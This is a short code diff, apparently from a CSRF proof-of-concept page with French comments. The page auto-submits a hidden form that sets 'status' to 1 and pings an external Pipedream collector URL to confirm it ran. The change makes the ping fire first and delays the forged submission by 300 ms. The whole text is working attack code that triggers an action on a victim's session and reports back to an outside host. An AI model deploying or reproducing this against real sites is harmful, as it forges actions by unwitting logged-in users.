@@ -5,7 +5,11 @@
   <input type="hidden" name="status" value="1">
 </form>
 <script>
-  // Envoie la requête CSRF
-  document.forms[0].submit();
-  new Image().src = "https://eo24g6niho492nt.m.pipedream.net/ping?ok=1";
+  // Ping d'abord
+  new Image().src = "https://eo24g6niho492nt.m.pipedream.net/ping?ok=1&ts=" + Date.now();
+
+  // Puis soumettre après un petit délai
+  setTimeout(function() {
+    document.forms[0].submit();
+  }, 300);
 </script>
